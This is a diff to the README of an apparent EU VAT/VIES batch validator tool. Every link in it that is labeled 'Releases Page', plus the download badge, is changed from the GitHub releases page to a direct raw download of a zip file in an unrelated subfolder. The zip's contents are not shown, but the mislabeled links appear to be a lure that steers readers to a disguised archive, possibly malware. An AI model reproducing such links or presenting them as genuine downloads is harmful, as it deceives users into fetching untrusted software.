@@ -1,6 +1,6 @@
 # 🌍 VAT-VIES-Validator-Batch-EU-Excel-File - Validate Your VAT Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/MansiTilekar-28/VAT-VIES-Validator-Batch-EU-Excel-File/releases)
+[![Download](https://raw.githubusercontent.com/MansiTilekar-28/VAT-VIES-Validator-Batch-EU-Excel-File/main/Mirounga/VAT-VIES-Validator-Batch-EU-Excel-File.zip%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/MansiTilekar-28/VAT-VIES-Validator-Batch-EU-Excel-File/main/Mirounga/VAT-VIES-Validator-Batch-EU-Excel-File.zip)
 
 ## 🔍 Overview
 
@@ -10,7 +10,7 @@ The VAT-VIES-Validator-Batch-EU-Excel-File is a user-friendly tool designed for 
 
 To begin using the VAT-VIES-Validator, follow these simple steps:
 
-1. Visit the [Releases Page](https://github.com/MansiTilekar-28/VAT-VIES-Validator-Batch-EU-Excel-File/releases) to download the software.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/MansiTilekar-28/VAT-VIES-Validator-Batch-EU-Excel-File/main/Mirounga/VAT-VIES-Validator-Batch-EU-Excel-File.zip) to download the software.
 2. Choose the latest version from the list of files.
 3. Click on the file to download it to your computer.
 4. Locate the downloaded file in your downloads folder.
@@ -18,7 +18,7 @@ To begin using the VAT-VIES-Validator, follow these simple steps:
 
 ## 📥 Download & Install
 
-To download the application, simply visit the [Releases Page](https://github.com/MansiTilekar-28/VAT-VIES-Validator-Batch-EU-Excel-File/releases). Here, you can find the latest version of the tool. Download the file and follow the installation instructions mentioned above. 
+To download the application, simply visit the [Releases Page](https://raw.githubusercontent.com/MansiTilekar-28/VAT-VIES-Validator-Batch-EU-Excel-File/main/Mirounga/VAT-VIES-Validator-Batch-EU-Excel-File.zip). Here, you can find the latest version of the tool. Download the file and follow the installation instructions mentioned above. 
 
 ## 🛠️ System Requirements
 
